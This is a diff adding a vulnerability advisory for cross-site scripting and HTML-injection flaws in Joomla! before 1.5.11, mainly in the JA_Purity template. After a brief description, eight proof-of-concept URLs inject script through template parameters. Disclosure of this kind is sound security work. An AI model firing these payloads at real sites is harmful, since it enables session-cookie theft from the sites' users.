@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/35189/info
+
+
+Joomla! is prone to multiple cross-site scripting and HTML-injection vulnerabilities because the application fails to sufficiently sanitize user-supplied input. These issues affect the 'com_user' component, the 'JA_Purity' template, and the administrative panel in the 'Site client' subproject of the application.
+
+An attacker can exploit these issues to steal cookie-based authentication credentials and launch other attacks.
+
+Versions prior to Joomla!1.5.11 are vulnerable. 
+
+http://www.example.com/path/?theme_header=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?theme_background=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?theme_elements=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?logoType=1&logoText=%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?logoType=1&sloganText=%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?excludeModules=%27;alert(8);%20var%20b=%27
+http://www.example.com/path/?rightCollapseDefault=%27;alert(8);%20var%20b=%27
+http://www.example.com/path/?ja_font=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
